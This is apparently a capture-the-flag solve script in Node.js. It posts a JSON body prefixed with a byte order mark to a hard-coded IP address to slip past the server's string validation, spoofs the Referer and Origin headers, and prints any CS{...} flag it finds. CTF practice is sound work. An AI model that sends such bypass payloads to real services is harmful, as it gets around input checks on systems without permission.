const http = require('http');

const url = new URL('http://49.213.52.6:6969/');

// The solution: Add BOM (Byte Order Mark) to bypass string validation
const postData = '\uFEFF' + JSON.stringify({ flagDaw: true });

const options = {
  hostname: url.hostname,
  port: url.port,
  path: url.pathname,
  method: 'POST',
  headers: {
    'Content-Type': 'text/plain;charset=UTF-8',
    'Content-Length': Buffer.byteLength(postData),
    'Referer': 'http://49.213.52.6:6969/',
    'Origin': 'http://49.213.52.6:6969/',
    'Accept': '*/*'
  }
};

console.log('Sending request with BOM bypass...');
console.log('Payload (hex):', Buffer.from(postData).toString('hex'));

const req = http.request(options, (res) => {
  console.log(`Status Code: ${res.statusCode}`);
  
  let data = '';
  res.on('data', (chunk) => {
    data += chunk;
  });
  
  res.on('end', () => {
    console.log('\nResponse:', data);
    if (data.includes('CS{')) {
      console.log('\n*** FLAG FOUND ***');
      const flagMatch = data.match(/CS\{[^}]+\}/);
      if (flagMatch) {
        console.log('FLAG:', flagMatch[0]);
      }
    }
  });
});

req.on('error', (e) => {
  console.error(`Problem with request: ${e.message}`);
});

req.write(postData);
req.end();

